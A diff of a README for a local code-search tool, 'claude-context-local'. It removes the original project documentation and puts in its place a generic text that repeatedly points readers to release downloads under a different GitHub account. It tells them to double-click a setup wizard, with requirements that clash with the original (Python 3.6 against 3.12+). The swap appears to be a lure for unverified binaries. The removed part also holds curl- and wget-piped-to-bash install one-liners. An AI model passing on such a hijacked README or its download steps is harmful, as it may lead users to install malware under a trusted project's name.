@@ -1,310 +1,72 @@
-```
-  ██████╗ ██╗       █████╗  ██╗   ██╗ ██████╗  ███████╗
- ██╔════╝ ██║      ██╔══██╗ ██║   ██║ ██╔══██╗ ██╔════╝
- ██║      ██║      ███████║ ██║   ██║ ██║  ██║ █████╗
- ██║      ██║      ██╔══██║ ██║   ██║ ██║  ██║ ██╔══╝
- ╚██████╗ ███████╗ ██║  ██║ ╚██████╔╝ ██████╔╝ ███████╗
-  ╚═════╝ ╚══════╝ ╚═╝  ╚═╝  ╚═════╝  ╚═════╝  ╚══════╝
+# 🎉 claude-context-local - Effortless Code Search Made Simple
 
-  ██████╗  ██████╗  ███╗   ██╗ ████████╗ ███████╗ ██╗  ██╗ ████████╗
- ██╔════╝ ██╔═══██╗ ████╗  ██║ ╚══██╔══╝ ██╔════╝ ╚██╗██╔╝ ╚══██╔══╝
- ██║      ██║   ██║ ██╔██╗ ██║    ██║    █████╗    ╚███╔╝     ██║
- ██║      ██║   ██║ ██║╚██╗██║    ██║    ██╔══╝    ██╔██╗     ██║
- ╚██████╗ ╚██████╔╝ ██║ ╚████║    ██║    ███████╗ ██╔╝ ██╗    ██║
-  ╚═════╝  ╚═════╝  ╚═╝  ╚═══╝    ╚═╝    ╚══════╝ ╚═╝  ╚═╝    ╚═╝
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/shreyashKilledar1/claude-context-local/releases)
 
- ██╗       ██████╗   ██████╗  █████╗  ██╗
- ██║      ██╔═══██╗ ██╔════╝ ██╔══██╗ ██║
- ██║      ██║   ██║ ██║      ███████║ ██║
- ██║      ██║   ██║ ██║      ██╔══██║ ██║
- ███████╗ ╚██████╔╝ ╚██████╗ ██║  ██║ ███████╗
- ╚══════╝  ╚═════╝   ╚═════╝ ╚═╝  ╚═╝ ╚══════╝
+## 🚀 Getting Started
 
-```
+Welcome to **claude-context-local**! This tool helps you search through your coding projects quickly and easily. You will no longer have to struggle to find pieces of code when working with your agent. This software builds a local codebase that can be referenced without incurring any API costs.
 
-Claude Context without the cloud. Semantic code search that runs 100% locally using EmbeddingGemma. No API keys, no costs, your code never leaves your machine.
+## 📥 Download & Install
 
-- 🔍 **Find code by meaning, not strings**
-- 🔒 **100% local - completely private**
-- 💰 **Zero API costs - forever free**
-- ⚡ **Fewer tokens in Claude Code and fast local searches**
+To get started, you need to download the software. Click the link below to visit the downloads page:
 
-An intelligent code search system that uses Google's EmbeddingGemma model and advanced multi-language chunking to provide semantic search capabilities across 15 file extensions and 9+ programming languages, integrated with Claude Code via MCP (Model Context Protocol).
+[Download the latest release](https://github.com/shreyashKilledar1/claude-context-local/releases)
 
-## 🚧 Beta Release
+### Steps to Install:
+1. **Visit the Downloads Page:** Click on the link above.
+2. **Choose the Latest Version:** Look for the most recent version listed on the page. 
+3. **Download the File:** Click on the download link for your operating system (Windows, Mac, or Linux).
+4. **Open the Downloaded File:** Locate the file in your downloads folder and double-click it.
+5. **Follow the Installation Prompts:** A setup wizard will appear. Simply follow the on-screen instructions until the installation finishes.
 
-- Core functionality working
-- Installation tested on Mac/Linux
-- Benchmarks coming soon
-- Please report issues!
+## 📋 System Requirements
 
-## Demo
+Before you download, make sure your computer meets the following minimum requirements:
 
-<img src="https://github.com/FarhanAliRaza/claude-context-local/releases/download/v0.1/example.gif" alt="Demo of local semantic code search" width="900" />
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Memory (RAM):** At least 4 GB.
+- **Disk Space:** 500 MB of free space for installation.
+- **Python:** Ensure Python 3.6 or later is installed if you plan to run the software from the command line.
 
-## Features
+## 🔍 Features
 
-- **Multi-language support**: 9+ programming languages with 15 file extensions
-- **Intelligent chunking**: AST-based (Python) + tree-sitter (JS/TS/Go/Java/Rust/C/C++/C#)
-- **Semantic search**: Natural language queries to find code across all languages
-- **Rich metadata**: File paths, folder structure, semantic tags, language-specific info
-- **MCP integration**: Direct integration with Claude Code
-- **Local processing**: All embeddings stored locally, no API calls
-- **Fast search**: FAISS for efficient similarity search
+- **Local Code Search:** The tool indexes your codebase and allows you to search through it locally, reducing the time needed to find code snippets.
+- **Easy Integration:** It works seamlessly with existing coding agents, improving their efficiency.
+- **No API Costs:** Perform code searches without worrying about additional fees, making this tool budget-friendly.
+- **Embeddings Storage:** The application creates embeddings and stores them locally, ensuring quick access.
 
-## Why this
+## 📖 Usage Instructions
 
-Claude’s code context is powerful, but sending your code to the cloud costs tokens and raises privacy concerns. This project keeps semantic code search entirely on your machine. It integrates with Claude Code via MCP, so you keep the same workflow—just faster, cheaper, and private.
+After installation, using the tool is straightforward:
 
-## Requirements
+1. **Open the Application:** Locate the installed app on your computer and double-click to launch.
+2. **Prepare Your Codebase:** Ensure your coding projects are accessible on your machine.
+3. **Index Your Code:** Use the indexing feature to scan through your codebase. This may take a few moments, depending on the size of your project.
+4. **Conduct Searches:** Enter keywords or code snippets in the search bar. The tool will display all relevant results quickly.
 
-- Python 3.12+
-- Disk: 1–2 GB free (model + caches + index)
-- Optional: NVIDIA GPU (CUDA 11/12) for FAISS acceleration; Apple Silicon (MPS) for embedding acceleration. These also speed up running the embedding model with SentenceTransformer, but everything still works on CPU.
-
-## Install & Update
-
-### Install (one‑liner)
+## 🛠 Troubleshooting
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
-```
+If you encounter any issues during installation or usage, please check the following:
 
-If your system doesn't have `curl`, you can use `wget`:
+- **Installation Errors:** Ensure your operating system is compatible. 
+- **Software Crashes:** Close other applications to free up memory.
+- **Search Issues:** Verify that your codebase has been indexed properly.
 
-```bash
-wget -qO- https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
-```
-
-### Update existing installation
-
-Run the same install command to update:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
-```
-
-The installer will:
-
-- Detect your existing installation
-- Preserve your embeddings and indexed projects in `~/.claude_code_search`
-- Stash any local changes automatically (if running via curl)
-- Update the code and dependencies
-
-### What the installer does
-
-- Installs `uv` if missing and creates a project venv
-- Clones/updates `claude-context-local` in `~/.local/share/claude-context-local`
-- Installs Python dependencies with `uv sync`
-- Downloads the EmbeddingGemma model (~1.2–1.3 GB) if not already cached
-- Tries to install `faiss-gpu` if an NVIDIA GPU is detected (interactive mode only)
-- **Preserves all your indexed projects and embeddings** across updates
-
-## Quick Start
-
-### 1) Register the MCP server (stdio)
-
-```bash
-claude mcp add code-search --scope user -- uv run --directory ~/.local/share/claude-context-local python mcp_server/server.py
-```
-
-Then open Claude Code; the server will run in stdio mode inside the `uv` environment.
-
-### 2) Index your codebase
-
-Open Claude Code and say: index this codebase. No manual commands needed.
-
-### 3) Use in Claude Code
-
-Interact via chat inside Claude Code; no function calls or commands are required.
+For common issues, please refer to the FAQ section in the documentation on the GitHub page.
 
-## Architecture
+## 💬 Support
 
-```
-claude-context-local/
-├── chunking/                         # Multi-language chunking (15 extensions)
-│   ├── multi_language_chunker.py     # Unified orchestrator (Python AST + tree-sitter)
-│   ├── python_ast_chunker.py         # Python-specific chunking (rich metadata)
-│   └── tree_sitter.py                # Tree-sitter: JS/TS/JSX/TSX/Svelte/Go/Java/Rust/C/C++/C#
-├── embeddings/
-│   └── embedder.py                   # EmbeddingGemma; device=auto (CUDA→MPS→CPU); offline cache
-├── search/
-│   ├── indexer.py                    # FAISS index (CPU by default; GPU when available)
-│   ├── searcher.py                   # Intelligent ranking & filters
-│   └── incremental_indexer.py        # Merkle-driven incremental indexing
-├── merkle/
-│   ├── merkle_dag.py                 # Content-hash DAG of the workspace
-│   ├── change_detector.py            # Diffs snapshots to find changed files
-│   └── snapshot_manager.py           # Snapshot persistence & stats
-├── mcp_server/
-│   └── server.py                     # MCP tools for Claude Code (stdio/HTTP)
-└── scripts/
-    ├── install.sh                    # One-liner remote installer (uv + model + faiss)
-    ├── download_model_standalone.py  # Pre-fetch embedding model
-    └── index_codebase.py             # Standalone indexing utility
-```
-
-### Data flow
-
-```mermaid
-graph TD
-    A["Claude Code (MCP client)"] -->|index_directory| B["MCP Server"]
-    B --> C{IncrementalIndexer}
-    C --> D["ChangeDetector<br/>(Merkle DAG)"]
-    C --> E["MultiLanguageChunker"]
-    E --> F["Code Chunks"]
-    C --> G["CodeEmbedder<br/>(EmbeddingGemma)"]
-    G --> H["Embeddings"]
-    C --> I["CodeIndexManager<br/>(FAISS CPU/GPU)"]
-    H --> I
-    D --> J["SnapshotManager"]
-    C --> J
-    B -->|search_code| K["Searcher"]
-    K --> I
-```
-
-## Intelligent Chunking
-
-The system uses advanced parsing to create semantically meaningful chunks across all supported languages:
+For further assistance, feel free to reach out to the community or check the issues section. Many users may have experienced similar problems and shared solutions.
 
-### Chunking Strategies
-- **Python**: AST-based parsing for rich metadata extraction
-- **All other languages**: Tree-sitter parsing with language-specific node type recognition
-
-### Chunk Types Extracted
-- **Functions/Methods**: Complete with signatures, docstrings, decorators
-- **Classes/Structs**: Full definitions with member functions as separate chunks
-- **Interfaces/Traits**: Type definitions and contracts
-- **Enums/Constants**: Value definitions and module-level declarations
-- **Namespaces/Modules**: Organizational structures
-- **Templates/Generics**: Parameterized type definitions
+## 🔗 Additional Resources
 
-### Rich Metadata for All Languages
-- File path and folder structure
-- Function/class/type names and relationships
-- Language-specific features (async, generics, modifiers, etc.)
-- Parent-child relationships (methods within classes)
-- Line numbers for precise code location
-- Semantic tags (component, export, async, etc.)
+- **Documentation:** Comprehensive user guides and details about features are available on the [GitHub Wiki](https://github.com/shreyashKilledar1/claude-context-local/wiki).
+- **Community Discussions:** Engage with other users and developers to share tips and best practices.
 
-## Configuration
+## 🔄 Updates
 
-### Environment Variables
+Stay updated with the latest features and improvements. Follow the repository to receive notifications about future releases. 
 
-- `CODE_SEARCH_STORAGE`: Custom storage directory (default: `~/.claude_code_search`)
+[Download the latest release](https://github.com/shreyashKilledar1/claude-context-local/releases)
 
-### Model Configuration
-
-The system uses `google/embeddinggemma-300m` by default.
-
-Notes:
-
-- Download size: ~1.2–2 GB on disk depending on variant and caches
-- Device selection: auto (CUDA on NVIDIA, MPS on Apple Silicon, else CPU)
-- You can pre-download via installer or at first use
-- FAISS backend: CPU by default. If an NVIDIA GPU is detected, the installer
-  attempts to install `faiss-gpu-cu12` (or `faiss-gpu-cu11`) and the index will
-  run on GPU automatically at runtime while saving as CPU for portability.
-
-#### Hugging Face authentication (if prompted)
-
-The `google/embeddinggemma-300m` model is hosted on Hugging Face and may require
-accepting terms and/or authentication to download.
-
-1. Visit the model page and accept any terms:
-
-   - https://huggingface.co/google/embeddinggemma-300m
-
-2. Authenticate one of the following ways:
-
-   - CLI (recommended):
-
-     ```bash
-     uv run huggingface-cli login
-     # Paste your token from https://huggingface.co/settings/tokens
-     ```
-
-   - Environment variable:
-     ```bash
-     export HUGGING_FACE_HUB_TOKEN=hf_XXXXXXXXXXXXXXXXXXXXXXXX
-     ```
-
-After the first successful download, we cache the model under `~/.claude_code_search/models`
-and prefer offline loads for speed and reliability.
-
-### Supported Languages & Extensions
-
-**Fully Supported (15 extensions across 9+ languages):**
-
-| Language | Extensions |
-|----------|------------|
-| **Python** | `.py` |
-| **JavaScript** | `.js`, `.jsx` |
-| **TypeScript** | `.ts`, `.tsx` |
-| **Java** | `.java` |
-| **Go** | `.go` |
-| **Rust** | `.rs` |
-| **C** | `.c` |
-| **C++** | `.cpp`, `.cc`, `.cxx`, `.c++` |
-| **C#** | `.cs` |
-| **Svelte** | `.svelte` |
-
-**Total**: **15 file extensions** across **9+ programming languages**
-
-## Storage
-
-Data is stored in the configured storage directory:
-
-```
-~/.claude_code_search/
-├── models/          # Downloaded models
-├── index/           # FAISS indices and metadata
-│   ├── code.index   # Vector index
-│   ├── metadata.db  # Chunk metadata (SQLite)
-│   └── stats.json   # Index statistics
-```
-
-## Performance
-
-- **Model size**: ~1.2GB (EmbeddingGemma-300m and caches)
-- **Embedding dimension**: 768 (can be reduced for speed)
-- **Index types**: Flat (exact) or IVF (approximate) based on dataset size
-- **Batch processing**: Configurable batch sizes for embedding generation
-
-Tips:
-
-- First index on a large repo will take time (model load + chunk + embed). Subsequent runs are incremental.
-- With GPU FAISS, searches on large indexes are significantly faster.
-- Embeddings automatically use CUDA (NVIDIA) or MPS (Apple) if available.
-
-## Troubleshooting
-
-### Common Issues
-
-1. **Import errors**: Ensure all dependencies are installed with `uv sync`
-2. **Model download fails**: Check internet connection and disk space
-3. **Memory issues**: Reduce batch size in indexing script
-4. **No search results**: Verify the codebase was indexed successfully
-5. **FAISS GPU not used**: Ensure `nvidia-smi` is available and CUDA drivers are installed; re-run installer to pick `faiss-gpu-cu12`/`cu11`.
-6. **Force offline**: We auto-detect a local cache and prefer offline loads; you can also set `HF_HUB_OFFLINE=1`.
-
-### Ignored directories (for speed and noise reduction)
-
-`node_modules`, `.venv`, `venv`, `env`, `.env`, `.direnv`, `__pycache__`, `.pytest_cache`, `.mypy_cache`, `.ruff_cache`, `.pytype`, `.ipynb_checkpoints`, `build`, `dist`, `out`, `public`, `.next`, `.nuxt`, `.svelte-kit`, `.angular`, `.astro`, `.vite`, `.cache`, `.parcel-cache`, `.turbo`, `coverage`, `.coverage`, `.nyc_output`, `.gradle`, `.idea`, `.vscode`, `.docusaurus`, `.vercel`, `.serverless`, `.terraform`, `.mvn`, `.tox`, `target`, `bin`, `obj`
-
-## Contributing
-
-This is a research project focused on intelligent code chunking and search. Feel free to experiment with:
-
-- Different chunking strategies
-- Alternative embedding models
-- Enhanced metadata extraction
-- Performance optimizations
-
-## License
-
-Licensed under the GNU General Public License v3.0 (GPL-3.0). See the `LICENSE` file for details.
-
-## Inspiration
-
-This project draws inspiration from [zilliztech/claude-context](https://github.com/zilliztech/claude-context). I adapted the concepts to a Python implementation with fully local embeddings.
+Now, enjoy a more efficient coding experience with **claude-context-local**!
